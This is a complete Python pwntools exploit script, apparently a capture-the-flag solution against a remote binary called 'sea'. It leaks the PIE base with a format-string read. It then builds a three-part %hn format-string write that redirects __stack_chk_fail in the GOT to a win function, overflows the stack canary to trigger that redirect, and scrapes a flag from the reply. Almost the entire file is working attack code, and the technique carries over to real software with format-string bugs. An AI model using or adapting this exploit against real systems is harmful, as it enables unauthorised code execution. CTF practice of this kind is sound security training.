#!/usr/bin/env python3
from pwn import *
import re

context.arch = "amd64"
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10009

elf = ELF("./sea", checksec=False)


def build_fmt_payload(pie_base: int) -> bytes:
    """Build format string to overwrite __stack_chk_fail@GOT -> system_reboot_comms.

    Three %hn writes (2 bytes each) to set the full 48-bit address.
    The algorithm auto-aligns the format string with the address payload
    appended on the stack, iterating until the expected $N offsets stabilize.
    Finally pad to 120 bytes to corrupt the stack canary.
    """
    target_got = pie_base + elf.got["__stack_chk_fail"]
    win = pie_base + elf.symbols["system_reboot_comms"]

    writes = {
        target_got: win & 0xFFFF,
        target_got + 2: (win >> 16) & 0xFFFF,
        target_got + 4: (win >> 32) & 0xFFFF,
    }
    ordered = sorted(writes.items(), key=lambda item: item[1])

    base_index = 16
    while True:
        printed = 0
        parts = []
        for i, (_, value) in enumerate(ordered):
            delta = (value - printed) & 0xFFFF
            if delta:
                parts.append(f"%{delta}c".encode())
            parts.append(f"%{base_index + i}$hn".encode())
            printed = value

        fmt = b"".join(parts)
        aligned = (len(fmt) + 1 + 7) & ~7
        new_base_index = 8 + aligned // 8
        if new_base_index == base_index:
            break
        base_index = new_base_index

    # format string -> null terminate -> align to 8 bytes -> append target addresses
    payload = fmt + b"\x00"
    payload = payload.ljust(aligned, b"A")
    payload += b"".join(p64(addr) for addr, _ in ordered)
    # pad to overflow and corrupt canary (trigger __stack_chk_fail after printf writes)
    payload = payload.ljust(120, b"B")
    assert len(payload) <= 0x7C
    return payload


def main() -> None:
    io = remote(HOST, PORT)

    # ---- round 1: leak PIE base ----
    io.recvuntil(b"[Remaining Attempts: 2] > ")
    io.sendline(b"%7$p")
    leak_line = io.recvline().strip()
    leak = int(leak_line, 16)
    pie_base = leak - 0x2078
    log.success(f"PIE base: {hex(pie_base)}")

    # ---- round 2: fmt-write GOT + smash canary ----
    io.recvuntil(b"[Remaining Attempts: 1] > ")
    payload = build_fmt_payload(pie_base)
    io.send(payload)

    data = io.recvall(timeout=5)
    io.close()

    # extract flag
    candidates = re.findall(rb"[A-Za-z][A-Za-z0-9_]{1,15}\{[^}\r\n]{1,200}\}", data)
    if candidates:
        for item in dict.fromkeys(candidates):
            log.success(item.decode("ascii", errors="ignore"))
    else:
        text = data.decode("latin-1", errors="ignore")
        log.info(text[:500])


if __name__ == "__main__":
    main()
